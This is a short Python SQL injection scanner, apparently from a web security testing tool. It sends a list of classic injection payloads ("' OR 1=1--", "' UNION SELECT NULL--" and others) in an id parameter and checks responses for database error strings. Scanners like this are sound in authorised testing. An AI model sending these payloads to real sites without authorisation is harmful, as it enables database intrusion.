import requests

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 'a'='a",
    "' OR 1=1#",
    "\" OR \"1\"=\"1",
    "' UNION SELECT NULL--"
]

ERROR_KEYWORDS = [
    "sql syntax",
    "mysql",
    "syntax error",
    "warning",
    "odbc",
    "unclosed quotation",
    "database error"
]


def scan_sqli(url, logger=None):
    if logger:
        logger("[+] Testing for SQL Injection...")
    else:
        print("\n[+] Testing for SQL Injection...\n")

    for payload in SQLI_PAYLOADS:
        test_url = f"{url}?id={payload}"

        try:
            response = requests.get(test_url, timeout=5)
            content = response.text.lower()

            for error in ERROR_KEYWORDS:
                if error in content:
                    msg = f"[!] SQLi detected using payload: {payload}"

                    if logger:
                        logger(msg)
                    else:
                        print(msg)

                    return {
                        "vulnerable": True,
                        "payload": payload,
                        "test_url": test_url,
                        "evidence": error
                    }

        except Exception:
            continue

    if logger:
        logger("[+] No SQL Injection detected")
    else:
        print("[+] No SQL Injection detected")

    return {
        "vulnerable": False
    }